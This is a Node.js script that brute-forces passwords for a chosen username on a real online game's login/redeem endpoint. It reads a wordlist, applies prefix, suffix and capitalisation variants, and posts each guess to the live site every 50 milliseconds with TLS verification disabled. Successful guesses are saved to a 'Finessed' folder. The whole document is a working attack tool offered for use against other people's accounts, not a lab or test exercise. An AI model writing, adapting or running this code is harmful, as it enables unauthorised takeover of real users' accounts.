const fs = require('fs');
var lineReader = require('line-reader');
const fetch2 = require("node-fetch");

const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
  });

  readline.question('Username to finess: ', username => {
    readline.question('What wordlist to use: ', filename => {
        readline.question('Use prefix: ', prefix => {
            readline.question('Use afterfix: ', afterfix => {
                readline.question('Capslock ? (a/f/n): ', capslock => {
                    finess(username, "Wordlists/" + filename + '.txt', prefix, afterfix, capslock);
                    readline.close();
                })
            })
        })
    });
});

async function readLines(filename: string, processLine: (line: string) => Promise<void>): Promise<void> {
    return new Promise((resolve, reject) => {
        lineReader.eachLine(filename, (line, last, callback) => {
            if (!callback) throw new Error('panic');
            processLine(line)
            .then(() => last ? resolve() : callback())
            .catch(reject);
        });
    });
}

const delay = (amount) => {
    return new Promise((resolve) => {
        setTimeout(resolve, amount);
    });
}

async function finess(username, filename, prefix, afterfix, capslock) {
    if (username.length == 0) {
        console.log("you didn't say what acc to finess idiot..");
        return;
    }
        await readLines(filename, async (line) => {
        await delay(50) // 10
        post_php(prefix, afterfix, capslock, line, username);
    });
}

async function post_php(prefix, afterfix, capslock, x, username) {
    process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
    x = prefix + x + afterfix
    if(capslock == 'a'){
        x = x.toUpperCase()
    } else if (capslock == 'f'){
        x = x.charAt(0).toUpperCase() + x.slice(1)
    }
    
    const params = new URLSearchParams();
    params.append('username', username);
    params.append('password', x);
    
    const post_options = {
        method: 'POST',
        body: params
    };
    
    const url = 'https://secure.xgenstudios.com/stickrpg2/redeem-fs.php?code=XGE190322-2259-68135|6282a9563a8a007ba1d1a8a8773e788b';
    await fetch2(url, post_options)
    .then(res => res.text())
    .then(text => {
        console.log("Trying: " + x)
        if(text.includes("been")){

            console.log("")
            process.stdout.write('\x07');
            console.log("\x1b[32m%s\x1b[0m", ">> Success: " + x)

            var foundData = `Found password for '${username}': ${x}`
            fs.writeFileSync("Finessed/" + username + "'s password.txt", foundData, (err) => {  
                if (err) throw err;
            })

            process.exit()
        }
    })
    .catch(error => {
        console.log(`ERROR: Failed to try '${x}'`);
    });
}
